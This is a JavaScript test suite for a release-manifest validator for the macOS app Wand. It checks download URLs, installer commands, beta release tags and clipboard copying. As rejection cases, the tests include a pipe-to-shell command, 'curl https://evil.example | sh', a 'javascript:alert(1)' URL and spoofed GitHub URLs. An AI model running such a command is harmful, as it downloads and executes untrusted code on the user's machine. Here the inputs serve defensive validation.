import test from "node:test";
import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { validateRelease, copyCommand, installCommand } from "./release.js";
const source = JSON.parse(
  await readFile(new URL("./release.json", import.meta.url)),
);
const stable = source;

test("only release assets and the established installer commands are accepted", () => {
  assert.equal(validateRelease(source), source);
  for (const url of [
    "https://evil.example/Wand-macOS-arm64.dmg",
    "https://github.com/elsewhere/repo/releases/download/v1/Wand-macOS-arm64.dmg",
    "https://github.com/wandapp/wandapp.github.io/releases/download/macos-v0.0.1/Wand-macOS-arm64.zip",
    "javascript:alert(1)",
  ]) {
    const value = structuredClone(source);
    value.macos.url = url;
    assert.throws(() => validateRelease(value));
  }
  const value = structuredClone(source);
  value.installer.command = "curl https://evil.example | sh";
  assert.throws(() => validateRelease(value));
});
test("unpublished and published manifests remain distinct", () => {
  for (const available of [false, true]) {
    const value = structuredClone(source);
    value.macos.available = available;
    value.installer.available = !available;
    assert.equal(validateRelease(value).macos.available, available);
    assert.equal(validateRelease(value).installer.available, !available);
  }
  const value = structuredClone(source);
  value.macos.available = "true";
  assert.throws(() => validateRelease(value));
});
test("beta and stable downloads stay in their own release tags", () => {
  const build = 202611110000;
  const source = structuredClone(stable);
  source.beta = {
    available: true,
    version: "0.4.2",
    build,
    url: `https://github.com/wandapp/wandapp.github.io/releases/download/macos-v0.4.2-b${build}/Wand-macOS-arm64.dmg`,
  };
  assert.equal(validateRelease(source).beta.build, build);
  for (const [field, replacement] of [
    ["url", source.macos.url],
    ["url", source.beta.url.replace(`-b${build}`, `-b${build + 1}`)],
    ["url", source.beta.url.replace("github.com/", "other@github.com/")],
    ["url", source.beta.url.replace(".dmg", ".zip")],
    ["build", 0],
    ["build", build + 0.5],
    ["build", String(build)],
    ["available", "true"],
    ["version", "01.4.0"],
  ]) {
    const value = structuredClone(source);
    value.beta[field] = replacement;
    assert.throws(() => validateRelease(value));
  }
  const hidden = structuredClone(source);
  hidden.beta = { available: false };
  assert.equal(validateRelease(hidden).beta.available, false);
  delete hidden.beta;
  assert.equal(validateRelease(hidden).beta, undefined);
});

test("copy succeeds only after the clipboard accepts the exact text", async () => {
  let copied;
  await copyCommand(source.installer.command, {
    writeText: async (value) => {
      copied = value;
    },
  });
  assert.equal(copied, source.installer.command);
  await assert.rejects(copyCommand("command", null));
  await assert.rejects(
    copyCommand("command", {
      writeText: async () => {
        throw new Error("Denied");
      },
    }),
  );
});

test("the page exposes one automatic installation command without a manual start", async () => {
  const html = await readFile(new URL("./index.html", import.meta.url), "utf8");
  assert.equal(html.split(installCommand).length - 1, 1);
  assert.doesNotMatch(html, /wand-core start|install-app\.sh|先安装 Core|不会自动打开/);
});

test("a Beta is advertised only while it is newer than stable", async () => {
  const { betaIsNewer } = await import("./release.js");
  const stable = { version: "0.4.1", build: 202611101910 };
  assert.equal(betaIsNewer(stable, { available: true, version: "0.1.4", build: 16 }), false);
  assert.equal(betaIsNewer(stable, { available: true, version: "0.4.1", build: 202611101910 }), false);
  assert.equal(betaIsNewer(stable, { available: true, version: "0.4.1", build: 202611110000 }), true);
  assert.equal(betaIsNewer(stable, { available: true, version: "0.5.0", build: 1 }), true);
  assert.equal(betaIsNewer(stable, { available: false }), false);
  assert.equal(betaIsNewer(stable, undefined), false);
});
